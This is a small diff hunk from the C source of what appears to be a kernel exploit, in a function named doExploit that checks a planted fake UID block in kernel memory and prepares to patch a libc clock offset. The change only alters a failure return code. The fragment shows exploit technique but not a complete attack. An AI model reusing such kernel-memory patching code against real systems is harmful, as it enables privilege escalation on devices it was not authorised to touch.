@@ -213,7 +213,7 @@ int doExploit(void) {
 
     // check that the fake UID block has been planted where we expect
     u32 test = readKram(newaddr+8);
-    if (test != type_uid) return -1;
+    if (test != type_uid) return 0xDEADBEEF;
 
     // backup data so we can restore later
     patch_addr = libc_clock_offset;
